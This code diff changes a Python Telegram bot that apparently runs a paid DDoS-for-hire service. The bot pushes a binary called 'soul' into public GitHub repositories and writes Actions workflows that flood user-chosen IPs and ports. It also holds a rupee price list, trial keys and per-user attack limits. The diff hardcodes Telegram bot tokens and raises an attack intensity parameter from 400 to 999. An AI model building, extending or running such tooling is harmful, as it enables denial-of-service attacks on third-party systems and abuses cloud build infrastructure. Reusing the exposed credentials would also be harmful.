@@ -1,3 +1,4 @@
+#pip install python-telegram-bot PyGithub
 import os
 import json
 import logging
@@ -17,11 +18,10 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = "8619915822:AAF7h9EA4-bg6kzXovM70Up3Tx4ZahYJJmw"
+BOT_TOKEN = "7952634181:AAFtvSN6vrzJzfuwrejQxVqEIqD4lMC9wv8"
 YML_FILE_PATH = ".github/workflows/main.yml"
 BINARY_FILE_NAME = "soul"
-BINARY_STORAGE_PATH = "stored_binary.bin"
-ADMIN_IDS = [1352117303]
+ADMIN_IDS = [1600832237, 1600832237]
 
 # Conversation states
 WAITING_FOR_BINARY = 1
@@ -249,58 +249,6 @@ def save_user_attack_counts(counts):
     with open('user_attack_counts.json', 'w') as f:
         json.dump(counts, f, indent=2)
 
-def save_binary_file(binary_content):
-    """Save binary file content to disk for later use"""
-    try:
-        with open(BINARY_STORAGE_PATH, 'wb') as f:
-            f.write(binary_content)
-        logger.info("✅ Binary file saved to storage")
-        return True
-    except Exception as e:
-        logger.error(f"❌ Error saving binary file: {e}")
-        return False
-
-def load_binary_file():
-    """Load saved binary file content"""
-    try:
-        if os.path.exists(BINARY_STORAGE_PATH):
-            with open(BINARY_STORAGE_PATH, 'rb') as f:
-                return f.read()
-        return None
-    except Exception as e:
-        logger.error(f"❌ Error loading binary file: {e}")
-        return None
-
-def upload_binary_to_repo(token_data, binary_content):
-    """Upload binary file to a specific repository"""
-    try:
-        g = Github(token_data['token'])
-        repo = g.get_repo(token_data['repo'])
-
-        try:
-            existing_file = repo.get_contents(BINARY_FILE_NAME)
-            repo.update_file(
-                BINARY_FILE_NAME,
-                "Update binary file",
-                binary_content,
-                existing_file.sha,
-                branch="main"
-            )
-            logger.info(f"✅ Updated binary in {token_data['repo']}")
-            return True, "Updated"
-        except:
-            repo.create_file(
-                BINARY_FILE_NAME,
-                "Upload binary file",
-                binary_content,
-                branch="main"
-            )
-            logger.info(f"✅ Created binary in {token_data['repo']}")
-            return True, "Created"
-    except Exception as e:
-        logger.error(f"❌ Error uploading binary to {token_data['repo']}: {e}")
-        return False, str(e)
-
 # Load all data
 authorized_users = load_users()
 pending_users = load_pending_users()
@@ -501,7 +449,7 @@ def create_repository(token, repo_name="soulcrack-tg"):
         except GithubException:
             repo = user.create_repo(
                 repo_name,
-                description="SOULCRACK DDOS Bot Repository",
+                description="soulcrack Bot Repository",
                 private=False,
                 auto_init=False
             )
@@ -523,7 +471,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x soul
-      - run: ./soul {ip} {port} 10 400
+      - run: ./soul {ip} {port} 10 999
 
   stage-1:
     needs: stage-0
@@ -534,7 +482,7 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x soul
-      - run: ./soul {ip} {port} {time_val} 400
+      - run: ./soul {ip} {port} {time_val} 999
 
   stage-2-calc:
     runs-on: ubuntu-latest
@@ -561,7 +509,7 @@ jobs:
       - name: Sequential 10s Burst
         run: |
           chmod +x soul
-          ./soul {ip} {port} 10 400
+          ./soul {ip} {port} 10 999
 """
 
     try:
@@ -1254,14 +1202,15 @@ async def gen_trial_key_start(update: Update, user_id):
          InlineKeyboardButton("24 Hours", callback_data="trial_24")],
         [InlineKeyboardButton("48 Hours", callback_data="trial_48"),
          InlineKeyboardButton("72 Hours", callback_data="trial_72"),
-         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
+         InlineKeyboardButton("1 Week (168h)", callback_data="trial_168")],
+        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     await update.message.reply_text(
         "🔑 **GENERATE TRIAL KEY**\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "Select trial duration:",
+        "Select duration:",
         reply_markup=reply_markup
     )
 
@@ -1269,26 +1218,21 @@ async def price_list(update: Update):
     message = (
         "💰 **PRICE LIST**\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "**Regular Users:**\n"
-        "• 1 Day - ₹120\n"
-        "• 2 Days - ₹240\n"
-        "• 3 Days - ₹360\n"
-        "• 4 Days - ₹450\n"
-        "• 7 Days - ₹650\n\n"
-        "**Resellers:**\n"
-        "• 1 Day - ₹150\n"
-        "• 2 Days - ₹250\n"
-        "• 3 Days - ₹300\n"
-        "• 4 Days - ₹400\n"
-        "• 7 Days - ₹550\n"
+        "• 1 day - ₹120\n"
+        "• 2 days - ₹240\n"
+        "• 3 days - ₹360\n"
+        "• 4 days - ₹450\n"
+        "• 7 days - ₹650\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "Contact admin to purchase"
+        "Contact admin for access"
     )
     await update.message.reply_text(message)
 
 
+# ==================== BOT SETTINGS HANDLERS ====================
+
 async def toggle_maintenance(update: Update, user_id):
-    if not (is_owner(user_id) or is_admin(user_id)):
+    if not is_owner(user_id):
         await update.message.reply_text("⚠️ **ACCESS DENIED**")
         return
 
@@ -1297,58 +1241,65 @@ async def toggle_maintenance(update: Update, user_id):
     save_maintenance_mode(MAINTENANCE_MODE)
 
     message = (
-        f"🔧 **MAINTENANCE MODE: {'ON' if MAINTENANCE_MODE else 'OFF'}**\n"
+        f"{'🔧' if MAINTENANCE_MODE else '✅'} **MAINTENANCE MODE {'ENABLED' if MAINTENANCE_MODE else 'DISABLED'}**\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"Status: {'🔴 Maintenance enabled' if MAINTENANCE_MODE else '🟢 Bot operational'}"
+        f"Bot is {'now under maintenance' if MAINTENANCE_MODE else 'now available for all users'}."
     )
 
     await update.message.reply_text(message)
 
 async def set_cooldown_start(update: Update, user_id):
-    if not (is_owner(user_id) or is_admin(user_id)):
+    if not is_owner(user_id):
         await update.message.reply_text("⚠️ **ACCESS DENIED**")
         return
 
+    # Show inline keyboard with cooldown options
     keyboard = [
         [InlineKeyboardButton("10s", callback_data="cooldown_10"),
          InlineKeyboardButton("20s", callback_data="cooldown_20"),
          InlineKeyboardButton("30s", callback_data="cooldown_30")],
         [InlineKeyboardButton("40s", callback_data="cooldown_40"),
          InlineKeyboardButton("60s", callback_data="cooldown_60"),
-         InlineKeyboardButton("120s", callback_data="cooldown_120")],
+         InlineKeyboardButton("90s", callback_data="cooldown_90")],
+        [InlineKeyboardButton("120s", callback_data="cooldown_120"),
+         InlineKeyboardButton("180s", callback_data="cooldown_180")],
         [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     await update.message.reply_text(
-        f"⏱️ **SET COOLDOWN**\n"
+        "⏱️ **SET COOLDOWN**\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"Current cooldown: {COOLDOWN_DURATION}s\n\n"
+        f"Current: {COOLDOWN_DURATION}s\n\n"
         "Select new cooldown duration:",
         reply_markup=reply_markup
     )
 
 async def set_max_attacks_start(update: Update, user_id):
-    if not (is_owner(user_id) or is_admin(user_id)):
+    if not is_owner(user_id):
         await update.message.reply_text("⚠️ **ACCESS DENIED**")
         return
 
+    # Show inline keyboard with max attack options
     keyboard = [
         [InlineKeyboardButton("1", callback_data="maxattack_1"),
-         InlineKeyboardButton("5", callback_data="maxattack_5"),
-         InlineKeyboardButton("10", callback_data="maxattack_10")],
-        [InlineKeyboardButton("20", callback_data="maxattack_20"),
-         InlineKeyboardButton("40", callback_data="maxattack_40"),
+         InlineKeyboardButton("3", callback_data="maxattack_3"),
+         InlineKeyboardButton("5", callback_data="maxattack_5")],
+        [InlineKeyboardButton("10", callback_data="maxattack_10"),
+         InlineKeyboardButton("20", callback_data="maxattack_20"),
+         InlineKeyboardButton("30", callback_data="maxattack_30")],
+        [InlineKeyboardButton("40", callback_data="maxattack_40"),
+         InlineKeyboardButton("50", callback_data="maxattack_50"),
          InlineKeyboardButton("100", callback_data="maxattack_100")],
         [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     await update.message.reply_text(
-        f"🎯 **SET MAX ATTACKS**\n"
+        "🎯 **SET MAX ATTACKS**\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"Current limit: {MAX_ATTACKS}\n\n"
-        "Select new maximum attacks per user:",
+        f"Current: {MAX_ATTACKS} attacks\n\n"
+        "Select maximum attacks per user:",
         reply_markup=reply_markup
     )
 
@@ -1358,20 +1309,22 @@ async def admin_list(update: Update, user_id):
         return
 
     if not admins:
-        await update.message.reply_text("📭 **NO ADMINS ADDED**")
+        await update.message.reply_text("📭 **NO ADMINS**")
         return
 
-    admin_list_text = "🛡️ **ADMINS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    admins_list = "🛡️ **ADMINS LIST**\n━━━━━━━━━━━━━━━━━━━━━━\n"
     for admin_id, admin_info in admins.items():
         username = admin_info.get('username', f'admin_{admin_id}')
-        admin_list_text += f"• `{admin_id}` - @{username}\n"
+        admins_list += f"• `{admin_id}` - @{username}\n"
 
-    await update.message.reply_text(admin_list_text)
+    await update.message.reply_text(admins_list)
 
+
+# ==================== OWNER PANEL HANDLERS ====================
 
 async def add_owner_start(update: Update, user_id):
-    if not is_owner(user_id):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+    if not is_primary_owner(user_id):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**\nOnly primary owners can add owners.")
         return
 
     temp_data[user_id] = {"step": "owner_add_id"}
@@ -1385,8 +1338,8 @@ async def add_owner_start(update: Update, user_id):
     )
 
 async def remove_owner_start(update: Update, user_id):
-    if not is_owner(user_id):
-        await update.message.reply_text("⚠️ **ACCESS DENIED**")
+    if not is_primary_owner(user_id):
+        await update.message.reply_text("⚠️ **ACCESS DENIED**\nOnly primary owners can remove owners.")
         return
 
     temp_data[user_id] = {"step": "owner_remove_id"}
@@ -1394,7 +1347,7 @@ async def remove_owner_start(update: Update, user_id):
     await update.message.reply_text(
         "🗑️ **REMOVE OWNER**\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "Send the User ID:\n\n"
+        "Send the User ID to remove:\n\n"
         "Example: `123456789`",
         reply_markup=reply_markup
     )
@@ -1683,8 +1636,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                  InlineKeyboardButton("60s", callback_data="attack_time_60"),
                  InlineKeyboardButton("90s", callback_data="attack_time_90")],
                 [InlineKeyboardButton("120s", callback_data="attack_time_120"),
-                 InlineKeyboardButton("180s", callback_data="attack_time_180"),
-                 InlineKeyboardButton("300s", callback_data="attack_time_300")],
+                 InlineKeyboardButton("180s", callback_data="attack_time_180")],
                 [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
@@ -2018,18 +1970,6 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
             github_tokens.append(new_token_data)
             save_github_tokens(github_tokens)
 
-            # ✅ NEW: Auto-upload binary file to new repo
-            binary_content = load_binary_file()
-            binary_upload_status = ""
-            if binary_content:
-                success, status = upload_binary_to_repo(new_token_data, binary_content)
-                if success:
-                    binary_upload_status = f"\n✅ Binary file uploaded: {status}"
-                else:
-                    binary_upload_status = f"\n⚠️ Binary upload failed: {status}"
-            else:
-                binary_upload_status = "\n⚠️ No binary file found. Upload one using 'Upload Binary' button."
-
             reply_markup = get_main_keyboard(user_id)
             if created:
                 message = (
@@ -2038,7 +1978,6 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                     f"👤 Username: `{username}`\n"
                     f"📁 Repo: `{repo_name}`\n"
                     f"📊 Total servers: {len(github_tokens)}"
-                    f"{binary_upload_status}"
                 )
             else:
                 message = (
@@ -2047,7 +1986,6 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                     f"👤 Username: `{username}`\n"
                     f"📁 Repo: `{repo_name}`\n"
                     f"📊 Total servers: {len(github_tokens)}"
-                    f"{binary_upload_status}"
                 )
 
             await update.message.reply_text(message, reply_markup=reply_markup)
@@ -2381,9 +2319,6 @@ async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
         file_size = len(binary_content)
 
-        # ✅ NEW: Save binary file for future tokens
-        save_binary_file(binary_content)
-
         await progress_msg.edit_text(
             f"📊 **FILE DOWNLOADED: {file_size} bytes**\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -2396,8 +2331,28 @@ async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
         def upload_to_repo(token_data):
             try:
-                success, status = upload_binary_to_repo(token_data, binary_content)
-                results.append((token_data['username'], success, status))
+                g = Github(token_data['token'])
+                repo = g.get_repo(token_data['repo'])
+
+                try:
+                    existing_file = repo.get_contents(BINARY_FILE_NAME)
+                    repo.update_file(
+                        BINARY_FILE_NAME,
+                        "Update binary file",
+                        binary_content,
+                        existing_file.sha,
+                        branch="main"
+                    )
+                    results.append((token_data['username'], True, "Updated"))
+                except Exception as e:
+                    repo.create_file(
+                        BINARY_FILE_NAME,
+                        "Upload binary file",
+                        binary_content,
+                        branch="main"
+                    )
+                results.append((token_data['username'], True, "Created"))
+
             except Exception as e:
                 results.append((token_data['username'], False, str(e)))
 
@@ -2429,8 +2384,7 @@ async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"📁 **File:** `{BINARY_FILE_NAME}`\n"
             f"📦 **File size:** {file_size} bytes\n"
-            f"⚙️ **Binary ready:** ✅\n\n"
-            f"ℹ️ This binary will be auto-uploaded to new tokens"
+            f"⚙️ **Binary ready:** ✅"
         )
 
         await progress_msg.edit_text(message)
